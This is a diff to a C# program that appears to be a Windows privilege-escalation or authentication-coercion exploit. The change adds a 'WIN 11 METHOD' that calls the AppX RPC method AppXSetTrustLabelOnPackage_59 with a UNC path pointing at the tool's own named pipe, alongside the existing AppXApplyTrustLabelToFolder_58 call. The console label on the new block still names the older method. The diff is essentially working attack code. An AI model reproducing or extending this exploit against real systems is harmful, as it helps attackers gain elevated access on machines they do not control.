@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.IO;
 using System.Text;
 using System.IO.Pipes;
@@ -230,11 +230,21 @@ namespace PNAC
             {
                 try
                 {
-                    Console.WriteLine("[!] Calling AppXApplyTrustLabelToFolder_58");
+                    Console.WriteLine("[!] Calling AppXApplyTrustLabelToFolder_58 (WIN 10 METHOD)");
                     Client client = new Client();
                     client.Connect();
                     string output;
                     client.AppXApplyTrustLabelToFolder_58("\\\\localhost\\\\.\\\\pipe\\PNAC", out output);
+                    Console.WriteLine(output);
+                }
+                catch { }
+                try
+                {
+                    Console.WriteLine("[!] Calling AppXApplyTrustLabelToFolder_58 (WIN 11 METHOD)");
+                    Client client = new Client();
+                    client.Connect();
+                    string output;
+                    client.AppXSetTrustLabelOnPackage_59("\\\\localhost\\\\.\\\\pipe\\PNAC", out output);
                     Console.WriteLine(output);
                 }
                 catch { }
